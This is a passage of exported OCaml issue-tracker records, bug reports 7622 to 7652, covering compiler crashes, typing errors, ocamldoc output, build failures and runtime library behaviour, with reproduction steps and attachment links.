fixed\n**Priority:** normal\n**Severity:** minor\n**Version:** 4.06.0 +dev/beta1/beta2/rc1\n**Target version:** 4.06.0 +dev/beta1/beta2/rc1\n**Category:** runtime system and C interface\n**Monitored by:** @gasche\n\n## Bug description\n\n#71 (https://github.com/ocaml/ocaml/pull/71) deprecated caml_strdup but the symbol is only defined if CAML_INTERNALS is defined, which breaks any non-OCaml C stubs using it.\n\n## Additional information\n\nhttps://github.com/ocaml/ocaml/pull/71#pullrequestreview-67307040\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7651\n**Reporter:** ksk\n**Status:** resolved (set by @xavierleroy on 2017-10-05T08:33:16Z)\n**Resolution:** not a bug\n**Priority:** normal\n**Severity:** minor\n**OS:** Mac OS X\n**OS Version:** 10.12.6\n**Version:** 4.05.0\n**Category:** standard library\n**Monitored by:** @gasche\n\n## Bug description\n\nWhen the executable file is compiled with unix.cma,\r\nUnix.getuid and Unix.geteuid return the same value\r\neven if the file has the sticky bit and is run by a non-owner.\r\nUnix.geteuid must return the owner's uid.\r\n\r\nThis can be observed even for a Linux platform CentOS 6.\n\n## Steps to reproduce\n\n1. Save the following program as suidtest.ml\r\n  let () =  Format.printf \"uid=%d@.euid=%d@.\" (Unix.getuid()) (Unix.geteuid())\r\n\r\n2. Compile with unix.cma and set the sticky bit to it.\r\n  ocamlc -o suidtest unix.cma suidtest.ml\r\n  chmod u+s suidtest\r\n\r\n3. Execute it as the root.\r\n  sudo ./suidtest\r\n\r\nThen the output is:\r\nuid=0\r\neuid=0\r\n\r\nIf it is compiled with unix.cmxa as a native code like:\r\n  ocamlopt -o suidtest unix.cmxa suidtest.ml\r\nthen the result is correctly\r\nuid=0\r\neuid=503\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7650\n**Reporter:** @gasche\n**Assigned to:** @gasche\n**Status:** resolved (set by @gasche on 2017-10-04T15:47:28Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Version:** 4.06.0 +dev/beta1/beta2/rc1\n**Target version:** 4.06.0 +dev/beta1/beta2/rc1\n**Fixed in version:** 4.06.0 +dev/beta1/beta2/rc1\n**Category:** configure and build/install\n**Monitored by:** @dbuenzli\n\n## Bug description\n\nI'm creating a mantis issue to discuss a compatibility problem that occurs in 4.06.0+dev due to the removal of the variables `bytecomp_c_compiler` and `native_c_compiler` from the `ocamlc -config` output.\r\n\r\nThe PR that made this change, by SÃ©bastien Hinderer, is #1114\r\n\r\n  https://github.com/ocaml/ocaml/pull/1114\r\n\r\nThe issue was raised by Andreas Hauptmann and Jeremy Yallop in\r\n\r\n  https://github.com/ocaml/ocaml/pull/1114/files#r142261040\n\n## Additional information\n\nDavid Allsopp suggested to pass C files to `ocamlc` directly, instead of relying on this configuration variable.\r\n\r\nFinally, please notes that various improvements were made (mostly by SÃ©bastien) over the 4.05 and 4.06 development cycles to the configuration system, with in particular the intention to separate the C variables used by the compiler distribution and the C variables that third-party OCaml users should use. (If in the future we add more errors/warnings to the internal C compiler flags, we don't want user code to break). Whatever solution is chosen must ensure that it cleanly respects this separation. See the relevant documentation of configuration variables at\r\n\r\n  https://github.com/ocaml/ocaml/pull/911/files#diff-e2d5a00791bce9a01f99bc6fd613a39dR331\n"},{"labels":[null,"bug",null],"text":"**Original bug ID:** 7649\n**Reporter:** @gasche\n**Status:** acknowledged (set by @damiendoligez on 2017-10-02T11:47:56Z)\n**Resolution:** open\n**Priority:** normal\n**Severity:** minor\n**Version:** 4.06.0 +dev/beta1/beta2/rc1\n**Category:** configure and build/install\n\n## Bug description\n\nWhen build \"make world.opt -j5\" in the 4.06 branch, I sometimes get the following failure:\r\n\r\nFile \"_none_\", line 1:\r\nError: Files testlib.cmx and ../compilerlibs/ocamlcommon.cmxa\r\n       make inconsistent assumptions over implementation Location\r\nMakefile:136: recipe for target 'ocamltest.opt' failed\r\nmake[3]: *** [ocamltest.opt] Error 2\r\nmake[3]: Leaving directory '/home/gasche/Prog/ocaml/github-4.06/ocamltest'\n"},{"labels":[null,"bug",null],"text":"**Original bug ID:** 7648\n**Reporter:** ChriChri\n**Status:** acknowledged (set by @dra27 on 2017-10-01T22:19:50Z)\n**Resolution:** open\n**Priority:** normal\n**Severity:** tweak\n**Category:** language features\n**Monitored by:** @Yakobowski\n\n## Bug description\n\nThe adoption of new function and the removal of old ones is \r\nslow down by the fact that many people want code that supports\r\ndifferent OCaml version.\r\n\r\nFor instance people must choose to use Char.lowercase and \r\nhave a warning on modern OCaml or abandon old version.\r\n\r\nInstead of using cpp of m4 (leading to code being less nice,\r\nfailure to autoindent with some editor modes, ...), I propose the following syntax extension that would lead to better code:\r\n\r\n  if @4.06 then\r\n    CODE1\r\n  else if @4.04 then\r\n    CODE2\r\n  else \r\n    CODE3\r\n  end\r\n\r\nThe semantics is always take the code the nearest to your\r\nactual version (CODE1 is for 4.06 and above, CODE2 for 4.04 and 4.05\r\nand CODE3 for the older version.\r\n\r\nThis syntax should not allow badly nested parenthesis/begin/end.\r\n\r\nFor the implementation, only one branch is kept, at lexing time ?\r\n\r\nThis should not be ambiguous ? \r\n\r\nOne pb I see:\r\n\r\nRemark: we can easily write a preprocessor to allow this syntax in OCaml version\r\nolder that the first one to have it buildin.\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7647\n**Reporter:** @yawaramin\n**Assigned to:** @gasche\n**Status:** resolved (set by @gasche on 2017-10-08T16:01:09Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** text\n**Fixed in version:** 4.07.0+dev/beta2/rc1/rc2\n**Category:** documentation\n\n## Bug description\n\nThe OCaml readme section 'Keeping in Touch with the Caml Community' mentions the ocaml.org website at the end of the section, and doesn't mention the discuss.ocaml.org forum at all. These two resources should be at the top of the section so users can immediately access them, and the older fora should be mentioned later.\n"},{"labels":["bug",null,null,null],"text":"**Original bug ID:** 7645\n**Reporter:** @c-cube\n**Assigned to:** @chambart\n**Status:** confirmed (set by @chambart on 2017-10-02T18:27:44Z)\n**Resolution:** open\n**Priority:** normal\n**Severity:** minor\n**Version:** 4.05.0\n**Category:** middle end (typedtree to clambda)\n**Duplicate of:** #3922\n**Related to:** #7349\n**Monitored by:** @gasche @mshinwell @chambart\n\n## Bug description\n\nWhen compiling the (very ugly) ml file in the linked archive, ocaml 4.05.0+flambda gives the following error:\r\n\r\nWarning 58: no cmx file was found in path for module CCFun, and its interface was not compiled with -opaque\r\n>> Fatal error: Map.disjoint_union Logtk.camlLogtk__Util__set_of_closures_anon-fn[/home/simon/.opam/4.05.0+flambda/build/ocaml/stdlib/format.ml:1248,4--46]_10533 => Util._1 <> Logtk._976\r\nFatal error: exception Misc.Fatal_error\n\n## Steps to reproduce\n\narchive: https://cedeela.fr/~simon/files/bugflambda.tar.gz\r\n\r\n- switch to 4.05.0+flambda\r\n- install containers\r\n- `$ tar xvf bugflambda.tar.gz`\r\n- `$ ocamlfind ocamlopt -c -package containers logtk.cmxa -I . parse_dk.ml`\r\n\r\nshould yield the error. Sorry for the size of the archive, it only seems to happen when .cmx files are present (not if there's only a cmxa), so I suspect it's related to inlining.\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7643\n**Reporter:** ChriChri\n**Assigned to:** @Octachron\n**Status:** resolved (set by @gasche on 2017-10-19T12:39:07Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Version:** 4.05.0\n**Target version:** 4.06.0 +dev/beta1/beta2/rc1\n**Fixed in version:** 4.07.0+dev/beta2/rc1/rc2\n**Category:** tools (ocaml{lex,yacc,dep,debug,...})\n**Monitored by:** ChriChri\n\n## Bug description\n\nocamldep loops on the attached file (clearly this file is exposing a \r\npb with my code generator that I am solving, but ocamldep should not loop)\r\n\r\nMay be it does not loop, but run for too long ... I killed after 1mn\r\n\r\nNote: the memory is not growing.\n\n## File attachments\n\n- [foo.ml](https://gist.githubusercontent.com/vicuna/a3cc23a4abc572d137013353c12e3a67/raw/5b98b14beb4db4ae772b1a2d9edbdb004fbab16f/foo.ml)\n"},{"labels":[null,"bug",null],"text":"**Original bug ID:** 7642\n**Reporter:** @glondu\n**Assigned to:** @xavierleroy\n**Status:** resolved (set by @xavierleroy on 2017-10-07T09:46:55Z)\n**Resolution:** fixed\n**Priority:** urgent\n**Severity:** block\n**Version:** 4.05.0\n**Target version:** 4.06.0 +dev/beta1/beta2/rc1\n**Fixed in version:** 4.06.0 +dev/beta1/beta2/rc1\n**Category:** back end (clambda to assembly)\n**Monitored by:** @gasche @yallop\n\n## Bug description\n\nIn Debian, with OCaml 4.05.0, (at least) menhir, extlib, coq, ocamlrss mysteriously fail to build on armel. While investigating the failure for ocamlrss, I discovered that the following program:\r\n\r\nlet a = int_of_string Sys.argv.(1);;\r\nPrintf.eprintf \"%d / 10 = %d\\n%!\" a (a/10);;\r\n\r\nwhen compiled with ocamlopt, prints \"10 / 10 = 0\". With ocamlc, the result is correct.\n\n## File attachments\n\n- [0010-arm-default-PIC.patch](https://gist.githubusercontent.com/vicuna/efdadf56c0363ff00426ced7e3f133a5/raw/3f6051a13565bec802c0dbec52ea1d02024c6bc1/0010-arm-default-PIC.patch)\n- [XL-001-tests-asmcomp.diff](https://gist.githubusercontent.com/vicuna/efdadf56c0363ff00426ced7e3f133a5/raw/155bcf35b026363394251283816ec798ab8bfb89/XL-001-tests-asmcomp.diff)\n- [armhf-movw-movt.patch](https://gist.githubusercontent.com/vicuna/efdadf56c0363ff00426ced7e3f133a5/raw/3c791e225fa6ab4814b2c02a210cbd2370d1f332/armhf-movw-movt.patch)\n- [configure-output.txt](https://gist.githubusercontent.com/vicuna/efdadf56c0363ff00426ced7e3f133a5/raw/7e2c028447271fb375fdcee034ba15a06161be6e/configure-output.txt)\n- [ocamlopt_bug.s](https://gist.githubusercontent.com/vicuna/efdadf56c0363ff00426ced7e3f133a5/raw/ebedc5b6219115f42b604c5f4f3fd1975da768e0/ocamlopt_bug.s)\n- [ocamlopt_bug_dcmm_dsel_dlinear.txt](https://gist.githubusercontent.com/vicuna/efdadf56c0363ff00426ced7e3f133a5/raw/5152ecb85db72a21c7814296dc91504adcb31048/ocamlopt_bug_dcmm_dsel_dlinear.txt)\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7641\n**Reporter:** kosik\n**Status:** acknowledged (set by @xavierleroy on 2017-09-29T18:06:12Z)\n**Resolution:** open\n**Priority:** low\n**Severity:** minor\n**Version:** 4.05.0\n**Category:** typing\n**Monitored by:** @gasche @yallop\n\n## Bug description\n\nWhen one tries to compile the following program:\r\n\r\n    (* 1  *)   module rec M1 :\r\n    (* 2  *)   sig\r\n    (* 3  *)     module M2 :\r\n    (* 4  *)     sig\r\n    (* 5  *)       val v2 : unit\r\n    (* 6  *)     end\r\n    (* 7  *)   end = struct\r\n    (* 8  *)   let v1 = M1.M2.v2\r\n    (* 9  *)     module M2 =\r\n    (* 10 *)      struct\r\n    (* 11 *)        let v2 = ()\r\n    (* 12 *)      end\r\n    (* 13 *)  end\r\n\r\nthe compiler complains:\r\n\r\n      File \"test_file.ml\", line 7, characters 21-186\r\n      Error: Cannot safely evaluate the definition\r\n             of the recursively-defined module M1\r\n\r\nThe error message is suboptimal (I think) in the following ways:\r\n- the location is vaguer than necessary\r\n- it is not clear (to me personally) what the error message means\r\n  and thus (in a non-trivial scenario) I found it difficult to\r\n  figure out what I needed to do.\n\n## File attachments\n\n- [test_file.ml](https://gist.githubusercontent.com/vicuna/efa2a1dc04ba335765ae3f6cdb82330c/raw/e43656269f7a7a24ce3859c4aa7994927e068aa4/test_file.ml)\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7640\n**Reporter:** AltGr\n**Assigned to:** @xavierleroy\n**Status:** resolved (set by @xavierleroy on 2017-10-11T08:55:29Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Version:** 4.05.0\n**Target version:** 4.06.0 +dev/beta1/beta2/rc1\n**Fixed in version:** 4.06.0 +dev/beta1/beta2/rc1\n**Category:** otherlibs\n**Related to:** #6903\n**Monitored by:** @gasche @dbuenzli\n\n## Bug description\n\n[ Original summary was: Unix.execvpe doesn't follow PATH updates since 4.05.0 ]\r\n\r\n`execvpe` searches the specified program in the PATH, and is given an environment. The usual behaviour -- or at least the behaviour on Linux until 4.04.2 -- is to lookup in PATH as defined in the new environment.\r\n\r\nPatch 36272215ef fixes a cygwin issue by avoiding `execvp`, and does the lookup in PATH manually, but based on the former value of PATH, not the new one specified in `env`.\r\n\r\nRef: https://github.com/ocaml/ocaml/commit/36272215ef\n\n## Steps to reproduce\n\nFrom the shell:\r\n\r\n    $ mkdir -p /tmp/foo\r\n    $ ln -s /bin/true /tmp/foo/frobz\r\n    $ ocaml <(echo '#use \"topfind\";; #require \"unix\";; Unix.execvpe \"frobz\" [||] [|\"PATH=/tmp/foo\"|];;')\r\n\r\nWorks on 4.04.2 and before, breaks on 4.05.0\n\n## Additional information\n\nThis typically trips opam when it creates a new switch, then attempts to run binaries within there. See for example https://travis-ci.org/ocaml/opam/jobs/279454219#L6216 or https://github.com/OCamlPro/ocp-indent/issues/256\n"},{"labels":["bug",null,null],"text":"**Original bug ID:** 7639\n**Reporter:** @johnwhitington\n**Assigned to:** @mshinwell\n**Status:** resolved (set by @mshinwell on 2017-09-26T15:27:37Z)\n**Resolution:** duplicate\n**Priority:** normal\n**Severity:** minor\n**Category:** configure and build/install\n\n## Bug description\n\nWe get:\r\n\r\n[WARNING] Something went wrong during alignment determination for\r\n 64-bit integers. I'm going to assume this architecture has\r\n alignment constraints. That's a safe bet: OCaml will work\r\n even if this architecture has actually no alignment\r\n constraints. echo #define ARCH_ALIGN_INT64\r\n\r\nThis is new with 10.13. Or, at least, I've not seen it before. I am using trunk.\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7638\n**Reporter:** @xavierleroy\n**Status:** resolved (set by @xavierleroy on 2017-09-28T09:44:41Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** major\n**Platform:** Mingw64\n**OS:** Windows 64\n**OS Version:** 10\n**Version:** 4.06.0 +dev/beta1/beta2/rc1\n**Target version:** 4.06.0 +dev/beta1/beta2/rc1\n**Fixed in version:** 4.06.0 +dev/beta1/beta2/rc1\n**Category:** platform support (windows, cross-compilation, etc)\n**Monitored by:** @gasche\n\n## Bug description\n\nConsider:\r\n\r\nlet crashme v =\r\n  ignore (Sys.getenv v)\r\n\r\nlet _ =\r\n  let th = Thread.create crashme \"no such variable\" in\r\n  Thread.join th\r\n\r\nCompile this program to bytecode using the Mingw64 port of OCaml and the trunk current at the time of this PR, i.e. 4.06.0+dev.  On a Windows 10 machine (ocaml-mingw-64-b from Inria's CI pool, to be exact), the program crashes reproducibly.  \r\n\r\nRunning it under a debugger shows a segfault in the call to longjmp() from caml_raise(), corresponding to Sys.getenv raising Not_found.\r\n\r\nA similar issue shows up with lib-threads/socketsbuf.ml from the OCaml test suite.\r\n\r\nThe program works fine when compiled to native code.\r\n\r\nThis might be an instance of the setjmp/longmp problem reported here:  https://sourceforge.net/p/mingw-w64/bugs/406/\r\n\r\nIndeed, the problem goes away if, as suggested in the problem report above, the bytecode interpreter is modified to use __builtin_setjmp and __builtin_longjmp instead of setjmp/longjmp.  Note however that those GCC builtins are undocumented.\n"},{"labels":["bug",null,null,null],"text":"**Original bug ID:** 7637\n**Reporter:** @nojb\n**Assigned to:** @gasche\n**Status:** resolved (set by @gasche on 2017-10-19T15:08:15Z)\n**Resolution:** won't fix\n**Priority:** high\n**Severity:** minor\n**Target version:** 4.06.0 +dev/beta1/beta2/rc1\n**Fixed in version:** 4.06.0 +dev/beta1/beta2/rc1\n**Category:** lexing and parsing\n\n## Bug description\n\n4.05 accepted\r\n\r\n  type t = < f: 'a.?foo:'a -> unit >\r\n\r\nbut 4.06 requires a space between '.' and '?':\r\n\r\n  type t = < f: 'a. ?foo:'a -> unit >\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7636\r\n**Reporter:** ChriChri\r\n**Assigned to:** @garrigue\r\n**Status:** confirmed (set by @lpw25 on 2017-10-02T16:40:50Z)\r\n**Resolution:** open\r\n**Priority:** normal\r\n**Severity:** minor\r\n**Target version:** 4.07.0+dev/beta2/rc1/rc2\r\n**Category:** typing\r\n**Monitored by:** ChriChri\r\n\r\n## Bug description\r\n\r\nIt looks like if variables were not values in Ocaml ?\r\n\r\nThis is not accepted :\r\n```ocaml\r\ntype 'a iter = { f : 'b.'a -> unit }\r\n\r\nlet promote f : 'a -> unit = { f }\r\n```\r\nThis works: \r\n```ocaml\r\nlet promote f =\r\n  let f : 'b.'a -> unit = fun x -> f x in\r\n  { f = fun x -> f x }\r\n```"},{"labels":["bug",null],"text":"**Original bug ID:** 7635\n**Reporter:** @yawaramin\n**Assigned to:** @Octachron\n**Status:** resolved (set by @Octachron on 2017-09-30T21:25:53Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Fixed in version:** later\n**Category:** ocamldoc\n**Tags:** ocamldoc\n**Monitored by:** @gasche\n\n## Bug description\n\nocamldoc does not generate span elements with linkable IDs when generating HTML documentation.\n\n## Steps to reproduce\n\nIf I have the following mli:\r\n\r\nmodule A : sig end\r\n\r\ntype a\r\n\r\nval a1 : a\r\n\r\nAnd I run ocamldoc on it to produce HTML documentation, the HTML will contain linkable IDs (in span elements) for the latter two items, but not the first one, that is not for the module:\r\n\r\n<span id=\"TYPEa\">...\r\n\r\n<span id=\"VALa1\">...\n"},{"labels":[null,"bug",null],"text":"**Original bug ID:** 7634\n**Reporter:** kosik\n**Status:** acknowledged (set by @xavierleroy on 2017-09-30T08:24:23Z)\n**Resolution:** open\n**Priority:** normal\n**Severity:** minor\n**Version:** 4.05.0\n**Category:** ocamldoc\n**Tags:** ocamldoc\n**Monitored by:** @yawaramin @gasche\n\n## Bug description\n\n(Original title was: ocamldoc generates strange looking documentation for variants with inline records)\r\n\r\nIf I define a variant type with inline records, e.g.:\r\n\r\n  type t = Foo of {field1 : int;\r\n                   field2 : int;\r\n                   field3 : int}\r\n           (** comment 1 *)\r\n\r\n       | Bar of {field1 : int;\r\n                 field2 : int;\r\n                 field3 : int}\r\n         (** comment 2 *)\r\n\r\nand I ask ocamldoc to generate the HTML documentation:\r\n\r\n  ocamldoc -html test.mli\r\n\r\nthen the documentation looks strange.\r\n\r\nThe comments starts on a line that contains \"{\" and end on a line that contains \"}\".\n\n## File attachments\n\n- [Screen Shot 2017-09-29 at 21.53.23.png](https://gist.githubusercontent.com/vicuna/137317331ebe85ad32707c63930bd188/raw/69bea7f773b450f49b6b51d9584f99c49592a229/Screen%20Shot%202017-09-29%20at%2021.53.23.png)\n- [test1.png](https://gist.githubusercontent.com/vicuna/137317331ebe85ad32707c63930bd188/raw/94209ec982451b5cb85e03504c63d1a16488fe69/test1.png)\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7632\n**Reporter:** kosik\n**Assigned to:** @Octachron\n**Status:** resolved (set by @Octachron on 2017-09-30T12:37:21Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** trivial\n**Version:** 4.05.0\n**Fixed in version:** 4.06.0 +dev/beta1/beta2/rc1\n**Category:** ocamldoc\n\n## Bug description\n\nocamldoc supports -charset option.\r\n\r\nThis is mentioned in\r\n\r\n  ocamldoc -help\r\n\r\nas well as, e.g., here:\r\n\r\n  http://caml.inria.fr/pub/docs/manual-ocaml/ocamldoc.html\r\n\r\nHowever, it is not mentioned in ocamldoc manual page.\r\n\r\nI guess that it probably makes sense to mention it also there.\n\n## Steps to reproduce\n\nman ocamldoc | grep charset\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7631\r\n**Reporter:** @psteckler\r\n**Assigned to:** @gasche\r\n**Status:** resolved (set by @gasche on 2017-09-19T14:19:40Z)\r\n**Resolution:** fixed\r\n**Priority:** normal\r\n**Severity:** crash\r\n**Fixed in version:** 4.06.0 +dev/beta1/beta2/rc1\r\n**Category:** compiler driver\r\n**Child of:** #7630\r\n\r\n## Bug description\r\n\r\nI have OPAM 4.06.0+fp+flambda installed (not available from the Mantis dropdown).\r\n\r\nRunning `make' with the attached code, I get a crash, with the stack trace:\r\n--\r\n$ make\r\nocamlopt -linscan -o runme b.ml a.ml\r\nFatal error: exception Invalid_argument(\"index out of bounds\")\r\nRaised by primitive operation at file \"asmcomp/linscan.ml\", line 111, characters 19-35\r\nCalled from file \"list.ml\", line 100, characters 12-15\r\nCalled from file \"asmcomp/linscan.ml\", line 115, characters 10-56\r\nCalled from file \"asmcomp/linscan.ml\", line 169, characters 4-28\r\nCalled from file \"list.ml\", line 100, characters 12-15\r\nCalled from file \"asmcomp/asmgen.ml\", line 87, characters 4-32\r\nCalled from file \"utils/misc.ml\", line 28, characters 20-27\r\nRe-raised at file \"utils/misc.ml\", line 28, characters 50-57\r\n--\r\n\r\n## Steps to reproduce\r\n\r\n$ tar -xzf linscan.tgz\r\n$ make\r\n\r\n## File attachments\r\n\r\n- [linscan.tgz](https://gist.githubusercontent.com/vicuna/b2aab75416ae7e10a5752ca7e06f31f0/raw/51679375ac2b2e0c24999f783192c8ab723178ce/linscan.tgz)\r\n"},{"labels":[null,"bug"],"text":"**Original bug ID:** 7630\n**Reporter:** @ejgallego\n**Assigned to:** @gasche\n**Status:** resolved (set by @gasche on 2018-09-10T14:51:33Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Platform:** AMD64\n**OS:** Linux\n**OS Version:** Ubuntu 17.04\n**Version:** 4.05.0\n**Fixed in version:** 4.07.0\n**Category:** back end (clambda to assembly)\n**Tags:** flambda\n**Related to:** #4074\n**Parent of:** #5546 #6001 #7067 #7631\n\n## Bug description\n\nDear OCaml developers,\r\n\r\nwe have observed very slow compilation times with `-flambda` in the\r\ncontext of the Coq project.\r\n\r\nIn particular, ocaml+flambda seems to struggle in a file that has a\r\nfew thousand top level trivial definitions of the form:\r\n\r\n```\r\nlet a = b\r\n```\r\n\r\nwhere `b` is defined in a different module.\r\n\r\nThe file takes around 7 minutes and 10GiB of RAM, which is a problem.\r\nCompilation time and memory seems significantly increased with regards\r\nto the non-flambda OCaml compiler. The problem seems present in 4.03.0\r\nand 4.05.0+trunk.\r\n\r\nNo command line option we have tried is able to improve this,\r\nincluding `-Oclassic` and `-rounds=0`.\n\n## Steps to reproduce\n\nI think that the best way to reproduce the bug is to compile Coq\r\nmaster with a flambda-enabled compiler. You will reach the problematic\r\nfile, `OrdersEx.v` in a few minutes. The concrete bad '.ml' file that\r\nCoq generates is available here https://ufile.io/kfcqi\n\n## Additional information\n\nPierre-Marie PÃ©drot profiled the compiler and he thinks that\r\n`ocamlopt` is stuck at register allocation, in concrete at\r\n`Coloring.walk`, but are lacking some more concrete data.\r\n\r\nThank you!\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7629\r\n**Reporter:** jacquev6\r\n**Status:** acknowledged (set by @xavierleroy on 2017-09-30T08:40:50Z)\r\n**Resolution:** open\r\n**Priority:** normal\r\n**Severity:** minor\r\n**Version:** 4.02.3\r\n**Category:** typing\r\n**Monitored by:** jacquev6 @Yakobowski\r\n\r\n## Bug description\r\n\r\nCompiling the attached code in two steps, using -intf-suffix .ml to re-use the .cmi produced in the first step, leads to a false typing error:\r\n\r\n    Values do not match:\r\n     val g : ([< `Poly of 'b M'.t & 'a M'.t ] as 'a) -> int\r\n    is not included in\r\n     val g : ([< `Poly of 'b M'.t & 'a M'.t ] as 'a) -> int\r\n\r\nNote that the expected and the actual type for g are exactly the same. And that there is only a .ml file, so there can't be any inconsistency between .ml and .mli file.\r\n\r\nThe code to exhibit this issue is rather complex: it contains a module alias, a recursive function, and uses a dynamic variant to make a recursive type from a parametric type. I think all are needed to exhibit the issue.\r\n\r\nContext:\r\n\r\nI was porting some code to jbuilder. After reducing my code to a minimal example, I reported the issue to jbuilder in https://github.com/janestreet/jbuilder/issues/254 and after investigation, Xavier Clerc says it's a compiler issue.\r\n\r\nJbuilder uses -intf-suffix to compile a .ml-only module to native after compiling it byte, in order to to re-use the .cmi file, as explained in this comment: https://github.com/janestreet/jbuilder/issues/254#issuecomment-329439785\r\n\r\n## Steps to reproduce\r\n\r\n1) Download test.ml (attached to this Mantis issue)\r\n\r\n2) Create test.cmi:\r\n\r\n    ocamlc -c test.ml\r\n\r\n3) Compile:\r\n\r\n    ocamlc -intf-suffix .ml test.ml -o test\r\n\r\n4) Observe:\r\n\r\n    ```\r\n    File \"test.ml\", line 1:\r\n    Error: The implementation test.ml does not match the interface test.cmi:\r\n           Values do not match:\r\n             val g : ([< `Poly of 'b M'.t & 'a M'.t ] as 'a) -> int\r\n           is not included in\r\n             val g : ([< `Poly of 'b M'.t & 'a M'.t ] as 'a) -> int\r\n           File \"test.ml\", line 13, characters 8-9: Actual declaration\r\n    ```\r\n\r\n## Additional information\r\n\r\nPossible workaround:\r\n\r\n(suggested by Leo White in this comment: https://github.com/janestreet/jbuilder/issues/254#issuecomment-329435563)\r\n\r\nAdd a polymorphic type annotation to g:\r\n\r\n    let rec g : 'a . ([< `Poly of 'a M'.t ] as 'a) -> int =\r\n\r\n\r\nVersions tested:\r\n\r\nSame behavior in 4.02.3 and 4.05.0+flambda, both on Linux and macOS.\r\n\r\n## File attachments\r\n\r\n- [test.ml](https://gist.githubusercontent.com/vicuna/33b5272fd3fd15dbdba043fc23902582/raw/db984b687b8d975fb433cf423ad9327e5123fc5d/test.ml)\r\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7627\n**Reporter:** furuse\n**Assigned to:** @lpw25\n**Status:** resolved (set by @gasche on 2017-09-15T09:16:35Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Version:** 4.05.0\n**Target version:** 4.06.0 +dev/beta1/beta2/rc1\n**Fixed in version:** 4.06.0 +dev/beta1/beta2/rc1\n**Category:** documentation\n\n## Bug description\n\n- Resurrect tabulation boxes in module Format. Rewrite/extend documentation\r\n  of tabulation boxes.\r\n\r\nThis changes the signature of Format and several applications which improve Format by themselves such as spotlib and omake fail to compile in 4.06.0+trunk.\r\n\r\nThe changes themselves are ok but please mark it as a breaking change.\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7626\n**Reporter:** ceastlund\n**Assigned to:** @gasche\n**Status:** resolved (set by @xavierleroy on 2017-09-24T15:17:04Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**OS:** Linux\n**Version:** 4.04.2\n**Fixed in version:** 4.06.0 +dev/beta1/beta2/rc1\n**Category:** runtime system and C interface\n**Monitored by:** @gasche\n\n## Bug description\n\nOn Linux, Sys.executable_name depends on /proc/self/exe if the symlink can be read, and otherwise falls back on argv[0].  The buffer used to read /proc/self/exe is 256 characters, so for long paths this always fails.\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7624\n**Reporter:** dinosaure\n**Assigned to:** @alainfrisch\n**Status:** resolved (set by @alainfrisch on 2017-09-13T21:51:21Z)\n**Resolution:** fixed\n**Priority:** normal\n**Severity:** minor\n**Version:** 4.03.0\n**Fixed in version:** 4.06.0 +dev/beta1/beta2/rc1\n**Category:** language features\n\n## Bug description\n\nWhen we have a unused value annotated with [@warning \"-32\"] and we compile with '-w @32', the compiler remains in fail.\n\n## Steps to reproduce\n\nmain.ml:\r\nlet[@warning \"-32\"] f x = x\r\n\r\nlet g x = x\r\n\r\nlet () = print_endline \"Hello Word!\"\r\n\r\nmain.mli:\r\nval g : 'a -> 'a\r\n\r\n$ ocamlc -w @32 main.mli main.ml\n\n## Additional information\n\nWhen we put [@@@warning \"-32\"] at top-level, all works - but I don't want to silent warning about all unused values.\n"},{"labels":["bug",null],"text":"**Original bug ID:** 7623\n**Reporter:** @mjambon\n**Status:** closed (set by @xavierleroy on 2017-10-03T12:01:37Z)\n**Resolution:** unable to duplicate\n**Priority:** normal\n**Severity:** trivial\n**Version:** 4.05.0\n**Category:** ocamldoc\n**Monitored by:** @Yakobowski\n\n## Bug description\n\nIt would be good if ocamldoc preserved type variables so that we could have the following in the documentation:\r\n\r\n<pre>\r\nval get : ('key, 'value) Hashtbl.t -> 'key -> 'value option\r\n</pre>\r\n\r\nAs it stands, the signature above gets converted into:\r\n\r\n<pre>\r\nval get : ('a, 'b) Hashtbl.t -> 'a -> 'b option\r\n</pre>\r\n\r\nWhat would it take to get this done?\n"},{"labels":["bug",null,null],"text":"**Original bug ID:** 7622\n**Reporter:** kosik\n**Status:** resolved (set by @xavierleroy on 2017-09-30T09:24:30Z)\n**Resolution:** suspended\n**Priority:** normal\n**Severity:** minor\n**Version:** 4.05.0\n**Category:** typing\n**Tags:** recmod\n**Monitored by:** @gasche\n\n## Bug description\n\nIf my \"b.mli\" file contains the following code:\r\n\r\n  (*1*)  module rec A :\r\n  (*2*)  sig\r\n  (*3*)    type t = T1\r\n  (*4*)  end\r\n  (*5*)\r\n  (*6*)  and B :\r\n  (*7*)  sig\r\n  (*8*)    type t = A.t = T1\r\n  (*9*)  end\r\n\r\nand I try to compile this file:\r\n\r\n  ocamlc -c b.mli\r\n\r\nthen I get the following error message:\r\n\r\n  File \"b.mli\", line 8, characters 9-26:\r\n  Error: This variant or record definition does not match that of type A.t\r\n         Their kinds differ.\r\n\r\nI've asked about this on caml-list\r\nhttps://sympa.inria.fr/sympa/arc/caml-list/2017-08/msg00043.html\r\nbut I haven't got a reply.\r\n\r\nMy questions:\r\n- What does the error message mean?\r\n  (Is it really necessary to reject the above fragment as ill-typed?)\r\n  - What is the kind of A.t?\r\n  - What is the kind of B.t?\r\n  - Why are the kinds of of B.t and A.t different?\n\n## Steps to reproduce\n\nocamlc -c b.mli\n\n## File attachments\n\n- 